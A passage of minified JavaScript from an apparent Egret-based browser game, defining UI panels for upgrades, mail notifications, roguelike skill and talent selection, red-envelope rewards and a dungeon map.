n=i.itemicon.localToGlobal();i["star"+e].globalToLocal(n.x+38,n.y+38,n),egret.Tween.get(i.effs[e]).to({x:n.x,y:n.y},500).call(function(){t.flys[e]=!1,egret.Tween.removeTweens(t.effs[e]),o.DisplayUtils.removeFromParent(t.effs[e])})}},i=this,n=0;n<this.effs.length;n++)e(n);l.TimerManager.ins().remove(this.timeClock,this),l.TimerManager.ins().doTimer(100,0,this.timeClock,this)},e.prototype.timeClock=function(){for(var t=0;t<this.flys.length;t++)if(this.flys[t])return;l.TimerManager.ins().remove(this.timeClock,this),this.finisheff||(this.finisheff=new n.MovieClip),this.finisheff.parent||this.star.addChild(this.finisheff),this.finisheff.x=145,this.finisheff.y=140;var e=this;this.finisheff.playFile(RES_DIR_EFF+"BreachEff3",1,function(){e.callbackToUpdate(),o.DisplayUtils.removeFromParent(e.finisheff)})},e.prototype.onClick=function(t){switch(t.target){case this.btnjihuo:case this.btntupo:t.target==this.btnjihuo?this.calldesc=e.JIHUO:(this.calldesc=e.TUPO,this.btntupo.touchEnabled=!1);var i=f.LongGasCT.ins().getSlotByInfo(this.slot);if(i){for(var n in i.cost)if(!s.GlobalFun.checkCost(i.cost[n].count,i.cost[n].id,"",!0,null,!1))return}else{var o=u.GlobalConfig.LoongGasPosCfg[this.slot];if(!o)return;for(var n in o[0].cost)if(!s.GlobalFun.checkCost(o[0].cost[n].count,o[0].cost[n].id,"",!0,null,!1))return}f.LongGasCT.ins().setGetUpTupo(this.slot),d.SoundUtil.play(d.SoundEnum.FORGE);break;case this.btnlianhua:if(this.isCan)return;var a=f.LongGasCT.ins().getSlotByInfo(this.slot);for(var n in a.cost)if(!s.GlobalFun.checkCost(a.cost[n].count,a.cost[n].id,"",!0,null,!1))return;this.calldesc=e.SHENGJI,f.LongGasCT.ins().setGetUpTupo(this.slot),d.SoundUtil.play(d.SoundEnum.FORGE),this.isCan=!0,Timer.start(1e3,1,this.setTimeOut,this)}},e.prototype.setTimeOut=function(){this.isCan=!1},e.TUPO=1,e.JIHUO=2,e.SHENGJI=3,e.maxCir=9,e}(a.BaseView);e.LongGasBreakPanel=g,window.LongGasBreakPanel=g,__reflect(g.prototype,"LongGasBreakPanel",[]),window.LongGasBreakPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasEnergy=void 0;var n=i(21),o=i(16),s=i(49),a=i(3),r=i(133),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LongGasEnergySkin",e.angle=90,e.isAct=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.anchorOffsetX=this.width/2,this.anchorOffsetY=this.height/2,this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){if(this.data){this.longName.source=this.data.name+"";var t=r.LongGasCT.ins().returnLongGasUnlockDataByID(this.data.id);null==this.effect&&(this.effect=new n.MovieClip,this.effGrop.addChild(this.effect)),this.effect.scaleX=this.effect.scaleY=this.data.size3||1,this.effect.x=this.data.pos3?this.data.pos3[0]:0,this.effect.y=this.data.pos3?this.data.pos3[1]:0,this.effect.playFile(RES_DIR_EFF+this.data.show,-1),t?this.mainG.filters=s.FilterUtil.normalColor:this.mainG.filters=s.FilterUtil.ARRAY_GRAY_FILTER,this.redPoint.visible=r.LongGasCT.ins().returnByLongGasRed(this.data.id)}},e.prototype.ClearAll=function(){this.effGrop.numElements>0&&this.cleanEff(),this.longName.source=""},e.prototype.cleanEff=function(){this.effect&&(o.DisplayUtils.removeFromParent(this.effect),this.effect=null)},e.prototype.onClick=function(){var t;r.LongGasCT.ins().selectOpenLongGasByID(null===(t=this.data)||void 0===t?void 0:t.id)},e}(a.BaseItemRender);e.LongGasEnergy=l,window.LongGasEnergy=l,__reflect(l.prototype,"LongGasEnergy",[]),window.LongGasEnergy=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasAttrItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LongGasAttrItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t,e;this.data&&(this.names.textFlow=n.TextFlowMaker.generateTextFlow(null===(t=this.data)||void 0===t?void 0:t.type),this.value.textFlow=n.TextFlowMaker.generateTextFlow(null===(e=this.data)||void 0===e?void 0:e.value))},e}(o.BaseItemRender);e.LongGasAttrItem=s,window.LongGasAttrItem=s,__reflect(s.prototype,"LongGasAttrItem",[]),window.LongGasAttrItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasNameItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay.text=""+(this.data||"")},e}(n.BaseItemRender);e.LongGasNameItem=o,window.LongGasNameItem=o,__reflect(o.prototype,"LongGasNameItem",[]),window.LongGasNameItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasSkillTipWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(65),r=i(133),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;
return e._sn_="WingPasSkillTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];if(null!=i&&(this.skillItem.data=i,this.skillLv.text="",this.skillNext.text="",6==i.type)){var o=i.cfg,l=s.GlobalConfig.SkillsDescConfig[o.desc];if(l){this.skillName.text=l.name,this.skillLv.text="LV."+i.lv,this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow1(a.SkillUtil.getDesc(o,o.desc_ex));var h=s.GlobalConfig.LoongGasCfg[r.LongGasCT.ins().openSelectID];i.isActive?this.skillNext.text=gettext("{0}{1}级解锁下一等级",h.nameshow,i.lv+1):this.skillNext.text=gettext("{0}1级激活",h.nameshow)}}},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(o.BaseView);e.LongGasSkillTipWin=l,window.LongGasSkillTipWin=l,__reflect(l.prototype,"LongGasSkillTipWin",[]),window.LongGasSkillTipWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailRedPoint=void 0;var n=i(14),o=i(196),s=function(t){function e(){var e=t.call(this)||this;return e.redPoint=0,observe(e,e.postRedPoint,o.MailCT.ins().postMailData,o.MailCT.ins().postGetItemFromMail,o.MailCT.ins().postMailDetail),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=this.redPoint;return this.redPoint=o.MailCT.ins().getUnreadMail()>0?1:0,t==this.redPoint?null:this.redPoint},__decorate([post()],e.prototype,"postRedPoint",null),e}(n.BaseSystem);e.MailRedPoint=s,window.MailRedPoint=s,__reflect(s.prototype,"MailRedPoint",[]),Systemap.MailRedPoint=function(){return s.ins()},window.MailRedPoint=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Item_GongLue=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WalkthroughBtnSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t=this.data;this.iconDisplay.source=t[1].icon},e}(n.BaseItemRender);e.Item_GongLue=o,window.Item_GongLue=o,__reflect(o.prototype,"Item_GongLue",[]),window.Item_GongLue=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Item_GongLue2=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.labelDisplay.text=t.title},e}(n.BaseItemRender);e.Item_GongLue2=o,window.Item_GongLue2=o,__reflect(o.prototype,"Item_GongLue2",[]),window.Item_GongLue2=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainCityItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.img.source=t.icon||"",this.lab.text=t.name||""},e}(n.BaseItemRender);e.MainCityItem=o,window.MainCityItem=o,__reflect(o.prototype,"MainCityItem",[]),window.MainCityItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueAttributeWin=void 0;var n=i(70),o=i(1),s=i(0),a=i(4),r=i(31),l=i(2),h=i(143),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="rogueattributeSkin",e.minV=0,e.maxV=0,e.isBtn=!1,e.isGetAttr=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this.eStart,this.onTouchs),this.addTouchEvent(this.startBtn,this.onTouchs),this.addTouchEvent(this.stopBtn,this.onTouchs),this.minV=s.GlobalConfig.OpenGameType1Cfg.iniAttrs[0],this.maxV=s.GlobalConfig.OpenGameType1Cfg.iniAttrs[1],this.initPrograss(),this.randomData(),this.eMod.source="Role_zy0"+a.ActorCC.jobId},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.eStart,this.onTouchs),this.removeTouchEvent(this.startBtn,this.onTouchs),this.removeTouchEvent(this.stopBtn,this.onTouchs)},e.prototype.initPrograss=function(){for(var t=0;this["bar"+t]&&(this["bar"+t].maximum=100,t++,this["bar"+t]););},e.prototype.onTouchs=function(t){switch(t.target){case this.startBtn:this.isGetAttr=!0,this.isBtn=!0,this.randomData(),Timer.start(200,-1,this.randomData,this);break;case this.stopBtn:if(!this.isGetAttr)return;h.RogueCT.ins().sendType1RodamAtt(),this.isBtn=!1,this.isGetAttr=!1,this.randomData();break;case this.eStart:if(this.isGetAttr)return void l.TipsCT.ins().showTips(gettext("请点击确定"));h.RogueCT.ins().sendType1ComeFb()}},e.prototype.randomData=function(){var t=n.MathUtils.random(0,s.GlobalConfig.OpenGameType1Cfg.boundary.length-1);this.realm.text=s.GlobalConfig.OpenGameType1Cfg.boundary[t],this.realm.textColor=r.QUALITY_COLOR[0>=t?1:t>=7?7:t],t=n.MathUtils.random(0,s.GlobalConfig.OpenGameType1Cfg.Understanding.length-1),this.comprehension.text=s.GlobalConfig.OpenGameType1Cfg.Understanding[t],this.comprehension.textColor=r.QUALITY_COLOR[0>=t?1:t>=7?7:t],t=n.MathUtils.random(0,s.GlobalConfig.OpenGameType1Cfg.appearance.length-1),this.appearance.text=s.GlobalConfig.OpenGameType1Cfg.appearance[t],this.appearance.textColor=r.QUALITY_COLOR[0>=t?1:t>=7?7:t];for(var e=0;this["bar"+e];){var i=n.MathUtils.random(5,100);if(this["bar"+e].value=i,e++,!this["bar"+e])break}if(!this.isBtn)return Timer.stop(this.randomData,this),void this.setAttValue();var o=n.MathUtils.random(this.minV,this.maxV);this.attack.text=o+"",o=n.MathUtils.random(this.minV,this.maxV),this.magic.text=o+"",o=n.MathUtils.random(this.minV,this.maxV),this.sorcery.text=o+"",o=n.MathUtils.random(this.minV,this.maxV),this.defense.text=o+""},e.prototype.setAttValue=function(){this.attack.text=h.RogueCT.ins().returnAttrById(142)||"0",this.magic.text=h.RogueCT.ins().returnAttrById(146)||"0",this.sorcery.text=h.RogueCT.ins().returnAttrById(144)||"0",this.defense.text=h.RogueCT.ins().returnAttrById(6)||"0"},e}(o.BaseView);e.RogueAttributeWin=u,window.RogueAttributeWin=u,__reflect(u.prototype,"RogueAttributeWin",[]),window.RogueAttributeWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueCardSelect=void 0;var n=i(5),o=i(1),s=i(0),a=i(31),r=i(2),l=i(143),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="roguecardSkin",e.rectClose=!1,e.isBtn=!1,e.nowSkillCount=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTouchs),observe(this,this.updateView,l.RogueCT.ins().updateCardData),this.updateView(),this.nowSkillCount=0},e.prototype.updateView=function(){var t=s.GlobalConfig.OpenGameType1_1Cfg;if(t){var e=l.RogueCT.ins().selectCardArr[0];if(e){var i=t[e.id];switch(this.name0.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("|C:{0}&T:{1}|",a.QUALITY_COLOR[i.quality],i.title)),this.describe0.textFlow=n.TextFlowMaker.generateTextFlow1(i.desc),i.quality){case 1:this.card0.source="forest_card_green";break;case 2:this.card0.source="forest_card_blue";break;case 3:this.card0.source="forest_card_purple";break;case 4:this.card0.source="forest_card_orange";break;case 5:this.card0.source="forest_card_red"}this.select0.visible=1==e.place?!0:!1}var o=l.RogueCT.ins().selectCardArr[1];if(e){var i=t[o.id];switch(this.name1.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("|C:{0}&T:{1}|",a.QUALITY_COLOR[i.quality],i.title)),this.describe1.textFlow=n.TextFlowMaker.generateTextFlow1(i.desc),i.quality){case 1:this.card1.source="forest_card_green";break;case 2:this.card1.source="forest_card_blue";break;case 3:this.card1.source="forest_card_purple";break;case 4:this.card1.source="forest_card_orange";break;case 5:this.card1.source="forest_card_red"}this.select1.visible=1==o.place?!0:!1}var r=l.RogueCT.ins().selectCardArr[2];if(r){var i=t[r.id];switch(this.name2.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("|C:{0}&T:{1}|",a.QUALITY_COLOR[i.quality],i.title)),this.describe2.textFlow=n.TextFlowMaker.generateTextFlow1(i.desc),i.quality){case 1:this.card2.source="forest_card_green";break;case 2:this.card2.source="forest_card_blue";break;case 3:this.card2.source="forest_card_purple";break;case 4:this.card2.source="forest_card_orange";break;case 5:this.card2.source="forest_card_red"}this.select2.visible=1==r.place?!0:!1}0==l.RogueCT.ins().selectCardCount?this.upgrade.text=gettext("请选择（{0}/3）项初始技能进行挑战",l.RogueCT.ins().returnSlectPlace()):this.upgrade.text=gettext("请选择（{0}/3）项祝福技能继续挑战",l.RogueCT.ins().returnSlectPlace()),this.replacenum.text=gettext("（{0}/3）",this.nowSkillCount)}},e.prototype.onTouchs=function(t){if(!this.isBtn)switch(t.target){case this.confirmBtn:if(this.nowSkillCount>=3&&!l.RogueCT.ins().isSetCardPlace())return void r.TipsCT.ins().showTips(gettext("请选择技能"));if(!l.RogueCT.ins().isSetCardPlace())return void r.TipsCT.ins().showTips(gettext("请选择技能"));l.RogueCT.ins().sendType1CardAtt(),this.isBtn=!0,this.isBtnHide();break;case this.replaceBtn:if(this.nowSkillCount<3&&l.RogueCT.ins().isSetCardPlace())return void r.TipsCT.ins().showTips(gettext("已选择技能，请点击确定"));if(this.nowSkillCount>=3&&!l.RogueCT.ins().isSetCardPlace())return void r.TipsCT.ins().showTips(gettext("请选择技能，并点击确定"));this.nowSkillCount++,l.RogueCT.ins().sendType1CardAtt(),this.isBtn=!0,this.isBtnHide();break;case this.grop0:this.select0.visible=!this.select0.visible;var e=this.select0.visible?1:0;l.RogueCT.ins().setSlectCardDataByIndex(1,e);break;case this.grop1:this.select1.visible=!this.select1.visible;var i=this.select1.visible?1:0;l.RogueCT.ins().setSlectCardDataByIndex(2,i);break;case this.grop2:this.select2.visible=!this.select2.visible;var n=this.select2.visible?1:0;l.RogueCT.ins().setSlectCardDataByIndex(3,n)}},e.prototype.isBtnHide=function(){this.isBtn=!1},__decorate([delayCall(1e3)],e.prototype,"isBtnHide",null),e}(o.BaseView);e.RogueCardSelect=h,window.RogueCardSelect=h,__reflect(h.prototype,"RogueCardSelect",[]),window.RogueCardSelect=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueTalentWin=void 0;var n=i(1),o=i(0),s=i(2),a=i(452),r=i(143),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="roguetalentSkin",e.nowSelectIndxArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.RogueTalentItem,this.eList.dataProvider=this.listAc=new eui.ArrayCollection},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTouch);var t=r.RogueCT.ins().canGetTelentArr;this.listAc.replaceAll(t),r.RogueCT.ins().nowHasSelectCard=[],r.RogueCT.ins().selectCardCount=0,r.RogueCT.ins().mosterIdx=0},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){if(t.target.parent.parent==this.eList){var e;if(this.eList.selectedIndex>=0&&this.eList.numElements>0){for(var i=0;i<this.eList.numElements;i++)e=this.eList.getChildAt(i),e.checkSelcted(this.eList.selectedIndex);this.nowSelectIndxArr.push(this.eList.selectedIndex),this.nowSelectIndxArr.length>o.GlobalConfig.OpenGameType1Cfg.initTalent.num&&this.nowSelectIndxArr.splice(0,1);for(var i=0;i<this.eList.numElements;i++)for(var n in this.nowSelectIndxArr)this.nowSelectIndxArr[n]==i&&(e=this.eList.getChildAt(i),e.checkSelcted(this.nowSelectIndxArr[n]))}}else if(t.target==this.nBtn){if(this.nowSelectIndxArr.length<o.GlobalConfig.OpenGameType1Cfg.initTalent.num)return void s.TipsCT.ins().showTips(gettext("请选择{0}个天赋",o.GlobalConfig.OpenGameType1Cfg.initTalent.num));for(var a=[],l=r.RogueCT.ins().canGetTelentArr,i=0;i<l.length;i++)for(var n in this.nowSelectIndxArr)this.nowSelectIndxArr[n]==i&&a.push(l[i]);r.RogueCT.ins().sendPassSlectTelent(a)}},e}(n.BaseView);e.RogueTalentWin=l,window.RogueTalentWin=l,__reflect(l.prototype,"RogueTalentWin",[]),window.RogueTalentWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueTalentItem=void 0;var n=i(3),o=i(0),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=o.GlobalConfig.OpenGameType1_1Cfg[this.data];t&&(this.names.text=t.title),this.select1.visible=this.select2.visible=!1},e.prototype.checkSelcted=function(t){this.select1.visible=this.select2.visible=this.itemIndex==t},e}(n.BaseItemRender);e.RogueTalentItem=s,window.RogueTalentItem=s,__reflect(s.prototype,"RogueTalentItem",[]),window.RogueTalentItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HongBaoOpenItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(2),r=i(9),l=i(171),h=i(454),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="hongbaoOpenSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.init()},e.prototype.init=function(){this.hbbtn.addEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this),this.addEventListener(egret.TouchEvent.TOUCH_END,this.onTouch,this),this.list.itemRenderer=h.HongBaoRewardsItem,this.closeBtn.visible=!1},e.prototype.onClick=function(t){switch(t.currentTarget){case this.hbbtn:if(!this.data||!this.data.actId||!this.data.eId)return;var e=r.Activity.ins().getActivityDataById(this.data.actId);if(!e.isOpenActivity())return void a.TipsCT.ins().showTips(gettext("活动已结束"));r.Activity.ins().sendReward(this.data.actId,this.data.eId,l.EnvelopeType.GET)}},e.prototype.onTouch=function(){this.close()},e.prototype.close=function(){this.callFun&&this.bt1&&this.bt2&&this.bt3&&(Timer.stop(this.close,this),this.parent&&(this.parent.removeChildren(),this.callFun()))},e.prototype.dataChanged=function(){if(this.data){var t=this.data.job,e=this.data.sex,i=this.data.name,o=this.data.text,a=this.data.index;this.myFace.source="yuanhead"+t+e,this.playerName.text=i,this.speaktxt.textFlow=n.TextFlowMaker.generateTextFlow1(o);var r=s.GlobalConfig.ActivityType12Config[this.data.actId][a];this.title.source="hongbao_title"+r.skinType}},e.prototype.destruct=function(){this.hbbtn.removeEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e.prototype.playAni=function(t,e,i){var n=this;this.removeChild(this.hbbtn),this.removeChild(this.hhbtnlabel),this.removeChild(this.speaktxt),this.removeChild(this.speakbg),this.topImg.scrollRect||(this.topImg.scrollRect=new egret.Rectangle(0,0,this.topImg.width,this.topImg.height)),this.downImg.scrollRect||(this.downImg.scrollRect=new egret.Rectangle(0,0,this.downImg.width,this.downImg.height));var o=this;this.callFun=function(){e&&e.call(i)};var s=this.topImg.scrollRect,a=this.downImg.scrollRect,r=400;this.list.dataProvider=new eui.ArrayCollection(t);var l=egret.Tween.get(s,{onChange:function(){n.topImg.scrollRect=s}}).to({y:this.topImg.height},r).call(function(){egret.Tween.removeTweens(l),o.bt1=!0,o.closeBtn.visible=!0}),h=egret.Tween.get(a,{onChange:function(){n.downImg.scrollRect=a}}).to({height:0},r).call(function(){egret.Tween.removeTweens(h),o.bt2=!0}),u=egret.Tween.get(this.downImg).to({y:this.downImg.y+this.downImg.height},r).call(function(){egret.Tween.removeTweens(u),o.bt3=!0});Timer.has(this.close,this)||Timer.start(1e4,0,this.close,this)},e}(o.BaseItemRender);e.HongBaoOpenItem=u,window.HongBaoOpenItem=u,__reflect(u.prototype,"HongBaoOpenItem",[]),window.HongBaoOpenItem=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HongBaoRewardsItem=void 0;var n=i(24),o=i(3),s=i(4),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="hongbaoRewardItem",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){if(this.data){var t=this.data.yb,e=this.data.gold,i=""+t,o="";this.itemIndex||this.data.name!=s.ActorCC.myName?(this.currentState="otherman",o=gettext("在红包里抢到了")):(this.currentState="owner",o=gettext("手气爆炸，在红包里抢到了")),e?(i=n.CommonUtils.overLength(e),o+=i+gettext("金币")):o+=i+gettext("元宝"),this.validateNow(),this.myFace.source="yuanhead"+this.data.job+this.data.sex,"otherman"==this.currentState?(this.speaktxt.text="",this.playerName.textFlow=(new egret.HtmlTextParser).parse('<font color="#5186FD">'+this.data.name+'</font><font color="#B1B097">'+o+"</font>")):(this.speaktxt.text=o,this.playerName.text=this.data.name)}},e.prototype.destruct=function(){},e}(o.BaseItemRender);e.HongBaoRewardsItem=a,window.HongBaoRewardsItem=a,__reflect(a.prototype,"HongBaoRewardsItem",[]),window.HongBaoRewardsItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HongBaoShowItem=void 0;var n=i(21),o=i(3),s=i(2),a=i(9),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="hongbaoShowItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.init()},e.prototype.init=function(){this.hbimg.addEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this),this.hongbaoeff.addEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e.prototype.onClick=function(){if(this.data&&this.data.actId&&this.data.eId){var t=a.Activity.ins().getActivityDataById(this.data.actId);if(!t.isOpenActivity())return void s.TipsCT.ins().showTips(gettext("活动已结束"));for(var e=t.envelopeData.length-1;e>=0;e--)if(!t.envelopeData[e]||t.envelopeData[e].id==this.data.eId){if(t.envelopeData[e].isOverTimer())return s.TipsCT.ins().showTips("|C:0xff0000&T:"+gettext("红包已过期")),void a.Activity.ins().postEnvelopeDataCall(null);break}a.Activity.ins().sendEnvelopeData(this.data.actId,this.data.eId)}},e.prototype.dataChanged=function(){if(this.data&&(this.eff||(this.eff=new n.MovieClip),!this.eff.parent)){this.hbimg.visible=!1,this.hongbaoeff.addChild(this.eff);var t=this;this.eff.playFile(RES_DIR_EFF+"RedPacket",1,function(){t.hbimg&&(t.hbimg.visible=!0)})}},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e}(o.BaseItemRender);e.HongBaoShowItem=r,window.HongBaoShowItem=r,__reflect(r.prototype,"HongBaoShowItem",[]),window.HongBaoShowItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixreincarnationsMapWin=void 0;var n=i(18),o=i(16),s=i(5),a=i(1),r=i(11),l=i(0),h=i(23),u=i(27),p=i(79),d=i(1073),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SixTrialsMap",e.id=1001,e.type=101,e.isUse=!1,e.WidthS=638,e.HeigtS=504,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward1.itemRenderer=r.ItemBase,this.lstReward1.dataProvider=this._rewardArr1=new eui.ArrayCollection,this.lstReward2.itemRenderer=r.ItemBase,this.lstReward2.dataProvider=this._rewardArr2=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(p.SixReisCT.ins().selectValue,this.uptateData),this.observe(p.SixReisCT.ins().updateMap,this.initItem),this.observe(p.SixReisCT.ins().updateMap,this.uptateData),this.addTouchEvent(this.goGetBtn,this.getGo),this.addTouchEvent(this.help,this.getHelp),this.initItem();var i=0;for(var n in p.SixReisCT.ins().sixBaseMap)if(i++,p.SixReisCT.ins().sixBaseMap[n].layer==p.SixReisCT.ins().pos)break;this.uptateData(i)},e.prototype.initItem=function(){this.clearMapItem();var t=l.GlobalConfig.SixUndergroundPalacesLayerConfig[p.SixReisCT.ins().sixLayer];if(t&&0!=p.SixReisCT.ins().sixBaseMap.length){var e=t.size[0]*t.size[1];p.SixReisCT.ins().rightBoArr.length>0;for(var i=1;e>=i;i++){if(p.SixReisCT.ins().rightBoArr.length>0&&i<=p.SixReisCT.ins().showMapCount,i){var n=p.SixReisCT.ins().sixBaseMap[i-1];}var o=new d.SixreincarnationsMapItem;o.id=i,this.contentGrop.addChild(o)}}},e.prototype.setMapShowOrHide=function(){if(0!=this.contentGrop.numElements)for(var t=0;t<this.contentGrop.numElements;t++){var e=this.contentGrop.getElementAt(t);if(e&&0==e.isShows){var i=this.contentGrop.getElementAt(t-10);if(i&&0!=i.isShows){e.setShowOb(!0);continue}var n=this.contentGrop.getElementAt(t-1);if(n&&0!=n.isShows){e.setShowOb(!0);continue}var o=this.contentGrop.getElementAt(t+1);if(o&&0!=o.isShows){e.setShowOb(!0);continue}var s=this.contentGrop.getElementAt(t+10);if(s&&0!=s.isShows){e.setShowOb(!0);continue}e.setShowOb(!1)}}},e.prototype.removeDisplay=function(){this.clearMapItem(),this.removeObserve(),this.removeTouchEvent(this.goGetBtn,this.getGo),this.removeTouchEvent(this.help,this.getHelp)},e.prototype.uptateData=function(t){void 0===t&&(t=-1),this.contentGrop.validateNow(),this.scrl.validateNow();var e=p.SixReisCT.ins().sixBaseMap;this.isUse=!1,t>=0&&(this.id=e[t-1].layer,this.type=e[t-1].type);var i=l.GlobalConfig.SixUndergroundPalacesTypeConfig;if(this.id==p.SixReisCT.ins().pos?(this.goGetBtn.enabled=!1,this.goGetBtn.label=gettext("当前在此")):(this.goGetBtn.enabled=!0,this.goGetBtn.label=gettext("前往")),this.id){var o=i[this.type].buffDesc,a=!0;if(o&&void 0!=o){a=!0;var r=p.SixReisCT.ins().returnBuffIdx(this.id);0==r?this.getBuff.text="无":this.getBuff.text=i[this.type].buffDesc[p.SixReisCT.ins().returnBuffIdx(this.id)-1]}else this.getBuff.text=gettext("无"),a=!1;this._rewardArr1.source=i[this.type].passRewardPre,this._rewardArr2.source=i[this.type].repeatRewardPre,this.isHadL.textFlow=p.SixReisCT.ins().isPosUnlock(this.id)?s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.GREEN_COLOR_N+"&T:"+gettext("（已获得）")+"|"):s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.RED_COLOR_N+"&T:"+gettext("（未获得）")+"|"),this.isHadL.visible=a,this.iconHad.visible=p.SixReisCT.ins().isPosUnlock(this.id)?!0:!1;var u=l.GlobalConfig.SixUndergroundPalacesLayerConfig[p.SixReisCT.ins().sixLayer].size,d=void 0;d=t%u[1]==0?172*(u[1]-p.SixReisCT.ins().showDirArr[0])-this.WidthS/2:172*(t%u[1]-p.SixReisCT.ins().showDirArr[0])-this.WidthS/2;var c=162*(t/u[0]-p.SixReisCT.ins().showDirArr[1])-this.scrl.height/2;p.SixReisCT.ins().rightBoArr[0]>3||p.SixReisCT.ins().rightBoArr[1]>3?(0>d?this.scrl.viewport.scrollH=0:this.scrl.viewport.contentWidth-this.WidthS>0&&d>=this.scrl.viewport.contentWidth-this.WidthS?this.scrl.viewport.scrollH=this.scrl.viewport.contentWidth-this.WidthS:this.scrl.viewport.scrollH=d,0>c?this.scrl.viewport.scrollV=0:this.scrl.viewport.contentHeight-this.scrl.height>0&&c>=this.scrl.viewport.contentHeight-this.scrl.height?this.scrl.viewport.scrollV=this.scrl.viewport.contentHeight-this.scrl.height:this.scrl.viewport.scrollV=c):(this.scrl.viewport.scrollH=d+80,this.scrl.viewport.scrollV=c+50),p.SixReisCT.ins().rightBoArr[0]<=3&&p.SixReisCT.ins().rightBoArr[1]<=3?(this.scrl.scrollPolicyH="false",this.scrl.scrollPolicyV="false"):p.SixReisCT.ins().rightBoArr[1]<=3?(this.scrl.scrollPolicyH="false",this.scrl.scrollPolicyV="auto"):p.SixReisCT.ins().rightBoArr[0]<=3?(this.scrl.scrollPolicyH="auto",this.scrl.scrollPolicyV="false"):(this.scrl.scrollPolicyH="auto",this.scrl.scrollPolicyV="auto");var 